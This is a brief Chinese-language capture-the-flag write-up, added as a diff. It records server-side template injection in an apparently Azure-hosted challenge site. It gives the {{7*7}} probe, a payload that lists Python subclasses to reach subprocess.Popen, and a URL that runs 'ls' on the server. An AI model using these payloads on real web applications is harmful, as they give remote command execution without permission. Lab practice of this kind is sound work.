@@ -1,0 +1,5 @@
+1) 根據指示login azure website
+2) 有空格可以輸入, 先來一個{{7*7}}, 變成49了, 即是中了SSTI
+3) 訪問https://webchallengemocsctf.azurewebsites.net/?name={{''.__class__.__base__.__subclasses__()}} 找到<class 'subprocess.Popen'>是第259個(從0開始數)
+4) 跑個ls  https://webchallengemocsctf.azurewebsites.net/?name={{%27%27.__class__.__base__.__subclasses__()[259]([%27ls%27],%20stdout=-1).communicate()}} 
+5) 沒了, ls了很久, 不知道該幹嘛
